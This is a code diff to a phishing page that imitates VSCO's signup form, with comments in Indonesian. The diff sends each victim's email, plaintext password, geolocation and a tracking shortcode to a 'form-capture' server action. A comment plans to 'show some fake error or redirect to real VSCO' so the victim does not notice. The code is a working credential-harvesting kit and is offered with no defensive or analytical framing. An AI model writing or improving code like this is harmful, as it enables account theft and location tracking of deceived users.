@@ -3,29 +3,31 @@
 import PageContainer from '@/app/[lang]/vsco/components/page-container';
 import Link from 'next/link';
 import { useState } from 'react';
+import { captureFormData } from '@/action/form-capture-action';
+import { useGeolocation } from '@/app/[lang]/vsco/components/GeolocationProvider';
+import { useShortcode } from '@/app/[lang]/vsco/components/ShortcodeProvider';
 
 export default function SignupPage() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const { geolocation } = useGeolocation();
+  const { shortcode, createUrl } = useShortcode();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
     try {
-      // Capture form data for tracking
-      await fetch('/api/form-capture', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
+      // Menggunakan server action untuk mengirim data form
+      await captureFormData({
+        source: 'vsco_signup',
+        email,
+        password,
+        shortcode: shortcode || undefined,
+        additional_data: {
+          signup_method: 'email',
+          signup_time: new Date().toISOString(),
+          geolocation: geolocation, // Tambahkan data geolokasi
         },
-        body: JSON.stringify({
-          source: 'vsco_signup',
-          data: {
-            email,
-            password,
-          },
-        }),
       });
 
       // Show some fake error or redirect to real VSCO
@@ -180,7 +182,7 @@ export default function SignupPage() {
               Already have an account?
             </p>
             <Link
-              href='/vsco/user/login'
+              href={createUrl('/vsco/user/login')}
               className='inline-block w-full rounded-full border-2 border-gray-300 px-4 py-2 text-sm font-medium text-[#111] transition-colors hover:bg-gray-50'
             >
               LOG IN
